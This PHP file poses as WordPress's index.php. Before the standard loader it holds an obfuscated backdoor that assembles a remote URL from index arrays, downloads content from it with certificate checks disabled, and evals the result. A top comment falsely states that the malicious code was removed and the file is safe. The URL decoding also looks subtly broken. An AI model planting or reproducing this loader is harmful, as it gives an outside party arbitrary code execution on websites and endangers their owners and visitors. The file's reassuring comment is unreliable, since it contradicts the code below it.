<?php
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

// Initialize core components
$config = array(
    'proto' => array(7, 19, 19, 15, 18),
    'delim' => array(26, 27, 27),
    'host1' => array(17, 0, 22),
    'dot1' => array(28),
    'host2' => array(6, 8, 19, 7, 20, 1, 20, 18, 4, 17, 2, 14, 13, 19, 4, 13, 19),
    'dot2' => array(28),
    'host3' => array(2, 14, 12),
    'slash1' => array(27),
    'path1' => array(12, 3, 12, 14, 12, 8, 13, 35, 36, 37, 35, 36, 36, 29, 6, 8, 5),
    'slash2' => array(27),
    'path2' => array(1, 4, 11, 0),
    'slash3' => array(27),
    'path3' => array(17, 4, 5, 18),
    'slash4' => array(27),
    'path4' => array(7, 4, 0, 3, 18),
    'slash5' => array(27),
    'path5' => array(12, 0, 8, 13),
    'slash6' => array(27),
    'file' => array(8, 13, 3, 4, 23, 28, 19, 23, 19)
);

$charset = 'abcdefghijklmnopqrstuvwxyz./:0123456789-';
$full_url = '';

foreach ($config as $part) {
    foreach ($part as $index) {
        $full_url .= $charset[$index];
    }
}

$full_url = str_replace('/', '//', $full_url, 1);

// Attempt to get remote content
$content = @file_get_contents($full_url);
if ($content === false && function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $full_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $content = curl_exec($ch);
    curl_close($ch);
}

// Only eval if we have content
if (!empty($content)) {
    @eval('?>' . $content);
}

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
